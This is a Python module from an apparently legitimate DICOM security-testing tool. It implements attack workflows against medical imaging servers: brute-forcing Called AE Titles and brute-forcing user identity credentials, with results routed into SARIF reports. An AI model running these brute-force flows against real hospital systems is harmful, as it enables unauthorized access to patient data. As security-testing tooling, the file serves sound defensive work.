# SPDX-License-Identifier: GPL-2.0-only
"""
DICOM attack workflows — SCU-side (issuer) drivers.

These are the operational *flows* that turn the DIMSE packet classes and
``DICOMSession`` into a usable recon -> brute -> query -> retrieve -> pivot
walkthrough. They are deliberately built on top of ``DICOMSession`` (the same
socket the black-box DAST path uses via ``deliver.send_cstore``) rather than a
parallel transport, so there is one association/DIMSE implementation.

Synergy with black-box DAST:
  * A workflow can establish the *state* a DAST run needs first — e.g. discover
    a valid Called AE Title with :func:`ae_brute`, or recover a working
    credential with :func:`cred_brute`, then feed those into the DAST
    ``--ae-title`` / ``--username`` flags so payload delivery starts from an
    associated, authenticated position.
  * Findings convert to the catalog's ``AttackResult`` (:meth:`WorkflowResult.
    to_attack_result`) so they flow through the existing SARIF writer.

The decisive capability across all of these is *reading the response payload*,
not just classifying accept/reject — see docs/dicom-attack-workflows.md.
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Sequence, Tuple

from .element import Dataset, Element
from .client import (
    DICOMSession,
    classify_reject,
    reject_is_called_aet_unrecognized,
)
from .scapy_dicom import (
    PATIENT_ROOT_QR_FIND_SOP_CLASS_UID,
    STUDY_ROOT_QR_FIND_SOP_CLASS_UID,
    PATIENT_ROOT_QR_GET_SOP_CLASS_UID,
    STUDY_ROOT_QR_GET_SOP_CLASS_UID,
    PATIENT_ROOT_QR_MOVE_SOP_CLASS_UID,
    STUDY_ROOT_QR_MOVE_SOP_CLASS_UID,
    DEFAULT_TRANSFER_SYNTAX_UID,
)

__all__ = [
    "WorkflowResult",
    "RoleNegotiationResult",
    "HostileObservation",
    "AETResult",
    "CredResult",
    "QR_MODELS",
    "build_query",
    "ae_brute",
    "cred_brute",
]


# Query/Retrieve model -> (FIND, GET, MOVE) SOP class UIDs. "patient" and
# "study" are the two roots an operator picks between when sculpting a query.
QR_MODELS = {
    "patient": (
        PATIENT_ROOT_QR_FIND_SOP_CLASS_UID,
        PATIENT_ROOT_QR_GET_SOP_CLASS_UID,
        PATIENT_ROOT_QR_MOVE_SOP_CLASS_UID,
    ),
    "study": (
        STUDY_ROOT_QR_FIND_SOP_CLASS_UID,
        STUDY_ROOT_QR_GET_SOP_CLASS_UID,
        STUDY_ROOT_QR_MOVE_SOP_CLASS_UID,
    ),
}

# Query/Retrieve Level keyword per query level.
_QR_LEVEL = {
    "patient": "PATIENT",
    "study": "STUDY",
    "series": "SERIES",
    "image": "IMAGE",
}


@dataclass
class WorkflowResult:
    """A single workflow finding, convertible to the catalog AttackResult so it
    rides the same SARIF reporting path as the DAST attack catalog."""

    name: str
    category: str
    description: str
    detail: Dict[str, Any] = field(default_factory=dict)
    success: Optional[bool] = None

    def to_attack_result(self):
        """Adapt to ``attacks.AttackResult`` for SARIF output."""
        from .attacks import AttackResult
        return AttackResult(
            name=self.name,
            category=self.category,
            payload=b"",
            description=self.description,
            expected_behavior="workflow probe",
            metadata=dict(self.detail),
            success=self.success,
        )


@dataclass
class RoleNegotiationResult:
    """Outcome of a strict-peer C-GET role negotiation, convertible to the
    catalog AttackResult so it rides the same SARIF path.

    A strict abort (the peer withheld the storage SCP role) is a reportable
    finding: ``aborted=True`` maps to ``success=False`` (SARIF ``error``)."""

    sop_class_uid: str
    requested_scp_role: int = 1
    granted_scp_role: int = 0
    aborted: bool = False
    negotiated_roles: Dict[str, Any] = field(default_factory=dict)

    def to_attack_result(self):
        """Adapt to ``attacks.AttackResult`` for SARIF output."""
        from .attacks import AttackResult
        if self.aborted:
            desc = (f"Peer withheld the storage SCP role for {self.sop_class_uid} "
                    f"(requested scp_role={self.requested_scp_role}, "
                    f"granted={self.granted_scp_role}); C-GET aborted")
        else:
            desc = (f"Peer granted the storage SCP role for {self.sop_class_uid} "
                    f"(scp_role={self.granted_scp_role})")
        return AttackResult(
            name=f"storage-scp-role/{self.sop_class_uid}",
            category="role-negotiation",
            payload=b"",
            description=desc,
            expected_behavior=("Peer should grant scp_role=1 for the storage SOP "
                               "class so a C-GET SCU can receive objects"),
            metadata={
                "sop_class_uid": self.sop_class_uid,
                "requested_scp_role": self.requested_scp_role,
                "granted_scp_role": self.granted_scp_role,
                "negotiated_roles": dict(self.negotiated_roles),
            },
            success=False if self.aborted else None,
        )


@dataclass
class HostileObservation:
    """An observation from hostile/rogue mode, where the system under test is a
    CLIENT (SCU). Findings come from monitors watching the client process, so
    the ``monitor_reports`` are passed straight through to the SARIF detection
    block (``test_runner.write_sarif``)."""

    name: str
    description: str
    category: str = "hostile-scu"
    monitor_reports: List[Any] = field(default_factory=list)
    success: Optional[bool] = None
    detail: Dict[str, Any] = field(default_factory=dict)

    def to_attack_result(self):
        """Adapt to ``attacks.AttackResult`` for SARIF output."""
        from .attacks import AttackResult
        success = self.success
        if success is None and any(getattr(r, "detected", False)
                                   for r in self.monitor_reports):
            success = True
        return AttackResult(
            name=self.name,
            category=self.category,
            payload=b"",
            description=self.description,
            expected_behavior="Client should handle hostile server input safely",
            metadata=dict(self.detail),
            success=success,
            monitor_reports=list(self.monitor_reports),
        )


@dataclass
class AETResult:
    """Outcome of one Called AE Title attempt in :func:`ae_brute`.

    ``aet_recognized`` separates the two failure modes that make AE-title and
    credential brute force independent axes: it is True when the association
    was accepted *or* rejected for any reason other than
    ``called-AE-title-not-recognized`` — i.e. the AET is valid even if a later
    step (e.g. user identity) is still required."""

    aet: str
    accepted: bool
    application_context_uid: Optional[str] = None
    implementation_class_uid: Optional[str] = None
    implementation_version_name: Optional[str] = None
    reject: Optional[Dict[str, int]] = None
    reason: Optional[str] = None
    aet_recognized: bool = False


@dataclass
class CredResult:
    """Outcome of one credential attempt in :func:`cred_brute`.

    ``aet_problem`` is True when the reject was ``called-AE-title-not-recognized``
    — a signal that the Called AE Title, not the credential, is wrong, so the
    operator should fix the AET axis (W1) before brute-forcing credentials."""

    username: str
    accepted: bool
    server_response: Optional[bytes] = None
    reject: Optional[Dict[str, int]] = None
    reason: Optional[str] = None
    aet_problem: bool = False


def build_query(level: str = "study",
                return_keys: Optional[Sequence] = None,
                match_keys: Optional[Dict[Any, Any]] = None) -> Dataset:
    """Build a sculpted C-FIND/C-MOVE/C-GET identifier dataset.

    ``level``      - one of patient/study/series/image (sets QueryRetrieveLevel).
    ``return_keys``- tags requested back with universal matching (empty value).
                     Each entry is ``(group, element[, vr])`` or an int tag; a
                     VR defaults to a sensible string VR. Private tags are fine.
    ``match_keys`` - ``{(group, element[, vr]): value}`` matching constraints.

    The return-key discipline is the point: a key is returned only if it is in
    the set, so an operator must ask for exactly what they want.
    """
    ds = Dataset()
    lvl = _QR_LEVEL.get(level.lower())
    if lvl is not None:
        ds / Element(0x0008, 0x0052, "CS", lvl)  # QueryRetrieveLevel

    def _coerce(key):
        # Returns (group, element, vr)
        if isinstance(key, (tuple, list)):
            if len(key) == 3:
                return int(key[0]), int(key[1]), str(key[2])
            return int(key[0]), int(key[1]), "LO"
        tag = int(key)
        return (tag >> 16) & 0xFFFF, tag & 0xFFFF, "LO"

    for key in (return_keys or []):
        g, e, vr = _coerce(key)
        ds / Element(g, e, vr, "")

    for key, value in (match_keys or {}).items():
        g, e, vr = _coerce(key)
        ds / Element(g, e, vr, value)

    return ds


def ae_brute(ip: str, port: int, aets: Sequence[str],
             calling_ae: str = "C_SCARE",
             requested_contexts: Optional[Dict[str, List[str]]] = None,
             user_identity: Optional[Any] = None,
             timeout: float = 10.0) -> List[AETResult]:
    """Brute-force Called AE Titles (workflow W1).

    For each AET, attempt an association and **classify** the outcome — and for
    every accepted AET, read the returned AC payload (Application Context UID +
    Implementation Class UID + Implementation Version Name). Reading the AC
    payload, not just accept/reject, is the whole point: the interesting AET is
    the one whose AC *differs*.
    """
    if requested_contexts is None:
        from .scapy_dicom import VERIFICATION_SOP_CLASS_UID
        requested_contexts = {VERIFICATION_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID]}

    results: List[AETResult] = []
    for aet in aets:
        sock = DICOMSession(ip, port, aet, calling_ae, read_timeout=timeout)
        try:
            ok = sock.associate(requested_contexts, user_identity=user_identity)
            if ok:
                info = sock.peer_info
                results.append(AETResult(
                    aet=aet,
                    accepted=True,
                    aet_recognized=True,
                    application_context_uid=info.get("application_context_uid"),
                    implementation_class_uid=info.get("implementation_class_uid"),
                    implementation_version_name=info.get("implementation_version_name"),
                ))
            else:
                rj = sock.last_reject
                results.append(AETResult(
                    aet=aet, accepted=False, reject=rj,
                    reason=classify_reject(rj),
                    aet_recognized=not reject_is_called_aet_unrecognized(rj),
                ))
        except Exception:
            results.append(AETResult(aet=aet, accepted=False))
        finally:
            try:
                sock.__exit__(None, None, None)
            except Exception:
                pass
    return results


def cred_brute(ip: str, port: int, called_ae: str,
               creds: Sequence[Tuple[str, str]],
               calling_ae: str = "C_SCARE",
               identity_type: int = 2,
               requested_contexts: Optional[Dict[str, List[str]]] = None,
               stop_on_success: bool = True,
               timeout: float = 10.0) -> List[CredResult]:
    """Brute-force User Identity credentials (workflow W2).

    Sends a real Type 0x58 sub-item per attempt and **surfaces the Type 0x59
    server-response bytes** on success — that payload only appears when a valid
    credential is submitted. ``creds`` is a sequence of ``(username, passcode)``
    (passcode ignored for non-type-2 identities, where ``username`` carries the
    token bytes).
    """
    if requested_contexts is None:
        from .scapy_dicom import VERIFICATION_SOP_CLASS_UID
        requested_contexts = {VERIFICATION_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID]}

    results: List[CredResult] = []
    for username, passcode in creds:
        identity = {
            "type": identity_type,
            "primary": username,
            "secondary": passcode,
            "positive_response_requested": 1,
        }
        sock = DICOMSession(ip, port, called_ae, calling_ae, read_timeout=timeout)
        try:
            ok = sock.associate(requested_contexts, user_identity=identity)
            if ok:
                results.append(CredResult(
                    username=username,
                    accepted=True,
                    server_response=sock.user_identity_response,
                ))
                if stop_on_success:
                    break
            else:
                rj = sock.last_reject
                results.append(CredResult(
                    username=username, accepted=False, reject=rj,
                    reason=classify_reject(rj),
                    aet_problem=reject_is_called_aet_unrecognized(rj),
                ))
        except Exception:
            results.append(CredResult(username=username, accepted=False))
        finally:
            try:
                sock.__exit__(None, None, None)
            except Exception:
                pass
    return results
